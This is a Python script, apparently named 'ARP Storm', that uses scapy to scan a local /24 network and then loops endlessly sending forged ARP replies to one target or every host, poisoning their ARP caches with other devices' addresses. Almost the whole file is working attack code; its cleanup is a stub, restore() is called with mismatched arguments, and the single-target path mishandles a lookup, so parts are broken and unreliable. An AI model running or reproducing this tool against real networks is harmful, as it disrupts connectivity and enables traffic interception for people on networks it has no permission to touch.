from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp, conf, get_if_addr
import time
import sys
import argparse
import random

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
        )
    
def scan():
    ip="192.168.1.0/24"
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    devices={}
    for element in answered_list:
        devices[element[1].psrc]=  element[1].hwsrc
    current_ip = get_if_addr(conf.iface)
    devices[current_ip] = get_if_hwaddr(conf.iface)
    return devices


def spoof(target_ip_mac, spoof_ip_mac, interface):
    target_mac = target_ip_mac[1]
    target_ip= target_ip_mac[0]
    spoof_mac = spoof_ip_mac[1]
    spoof_ip = spoof_ip_mac[0]
    packet = Ether(dst=target_mac, src=spoof_mac) / \
             ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=0)
    return

def restore(target_ip_mac, original_ip_mac, interface):
    return

def start_attack(ip, iface, multi):
    devices = scan()
    if multi:
        for target_ip_mac in devices.items():
            spoof(target_ip_mac, devices[random.choice(list(devices.keys()))], iface)
    else:
        spoof(devices[ip], devices[random.choice(list(devices.keys()))], iface)
    return

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='ARP Storm')
    parser.add_argument('target', help='IP of first target')
    parser.add_argument('-i', '--interface', default='eth0',
                       help='Network interface (default: eth0)')
    parser.add_argument('-m', '--multi', default=False,
                       help='Enable multi-MAC ARP storm')
    
    args = parser.parse_args()
    
    ip = args.target
    iface = args.interface
    storm = args.multi
    
    try:
        print(f"[*] Starting ARP attack om {args.target}")
        while True:
            start_attack(ip, iface, storm)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables")
        restore(ip, iface)
        sys.exit(0)
        
